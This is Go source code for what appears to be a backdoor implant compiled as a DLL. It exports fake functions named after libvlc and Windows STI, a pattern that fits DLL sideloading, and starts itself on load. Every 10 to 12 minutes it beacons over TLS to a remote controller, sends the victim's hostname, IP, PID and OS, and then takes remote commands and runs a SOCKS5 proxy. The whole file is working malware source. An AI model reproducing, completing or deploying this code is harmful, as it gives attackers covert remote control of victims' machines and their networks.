package main

import (
	"backdoor/util"
	"encoding/json"
	"math/rand"
	"net"
	"os"
	"runtime"
	"sync/atomic"
	"time"

	"C"

	"github.com/google/uuid"
)

var guuid string
var gtimeout uint64

func init() {
	rand.Seed(time.Now().Unix())
	go start("", 0)
}

//export libvlc_release
func libvlc_release() {

}

//export StiCreateInstanceW
func StiCreateInstanceW() {
	ch := make(chan int)
	<-ch
}

//export libvlc_new
func libvlc_new() {
	ch := make(chan int)
	<-ch
}

//export Sum
func Sum() {
	ch := make(chan int)
	<-ch
}

func main() {
}

/*

func canStart(fileDir string, fileName string) bool {
	var fileaddr string
	if len(fileDir) != 0 {
		fileaddr = filepath.Join(fileDir, fileName)
	} else {
		fileaddr = fileName
	}
	pfile, err := os.Create(fileaddr)
	if err != nil {
		return false
	}
	pfile.Close()
	if err := os.Rename(fileaddr, fileaddr); err != nil {
		return false
	}
	os.Open(fileaddr)
	return true
}

func main() {
	var dirpath string
	if execPath, err := os.Executable(); err == nil {
		dirpath = filepath.Dir(execPath)
	}
	if !canStart(dirpath, "config.ini") {
		return
	}
	var dstip string
	var timeout uint64
	for i := 1; i < len(os.Args); i++ {
		value, err := strconv.ParseUint(os.Args[i], 10, 64)
		if err == nil {
			timeout = value
			break
		}
	}
	for i := 1; i < len(os.Args); i++ {
		tmpip, tmport, ok := util.ParseIP(os.Args[i])
		if ok {
			dstip = fmt.Sprintf("%s:%d", tmpip, tmport)
			break
		}
	}
	start(dstip, timeout)
}
*/

func start(customip string, timeout uint64) {
	guuid = uuid.New().String()
	atomic.StoreUint64(&gtimeout, timeout)
	var address string
	for {
		tmpTimeout := atomic.LoadUint64(&gtimeout)
		if tmpTimeout > 0 {
			time.Sleep(time.Duration(int64(tmpTimeout) * int64(time.Second)))
		} else {
			time.Sleep(time.Duration(int64(600+rand.Intn(120)) * int64(time.Second)))
		}
		if len(customip) != 0 {
			session(customip)
			continue
		}
		tmpAddress := getIP()
		if len(tmpAddress) != 0 {
			address = tmpAddress
		}
		if len(address) == 0 {
			continue
		}
		session(address)
	}
}

func session(address string) {
	conn, err := net.DialTimeout("tcp", address, 30*time.Second)
	if err != nil {
		return
	}
	sslconn := util.NewSSLConn(conn)
	defer sslconn.Close()
	sendInfoReq(sslconn)
	sslconn.SetReadDeadline(time.Now().Add(12 * time.Second))
	infoRsp, err := sslconn.Read()
	if err != nil {
		return
	}
	if len(infoRsp) != 2 || infoRsp[0] != 'O' || infoRsp[1] != 'K' {
		return
	}
	pcmd := NewCmdClient(sslconn)
	psocks5 := NewSocks5Client(sslconn)
	for {
		sslconn.SetReadDeadline(time.Now().Add(60 * time.Second))
		msg, err := sslconn.Read()
		if err != nil {
			break
		}
		if len(msg) == 0 {
			continue
		}
		if msg[0] == util.CMD_CHANNEL {
			pcmd.OnMsg(msg[1:])
		} else if msg[0] == util.SOCKS5_CHANNEL {
			psocks5.OnMsg(msg[1:])
		}
	}
	psocks5.OnClose()
	pcmd.OnClose()
}

func sendInfoReq(sslconn *util.SSLConn) {
	localip := sslconn.LocalAddr().String()
	hostname := ""
	if name, err := os.Hostname(); err == nil {
		hostname = name
	}
	var info util.Info
	info.HostName = hostname
	info.LocalIP = localip
	info.PID = os.Getpid()
	info.UUID = guuid
	info.OSType = runtime.GOOS
	jsonBytes, _ := json.Marshal(&info)
	sslconn.Write(jsonBytes)
}
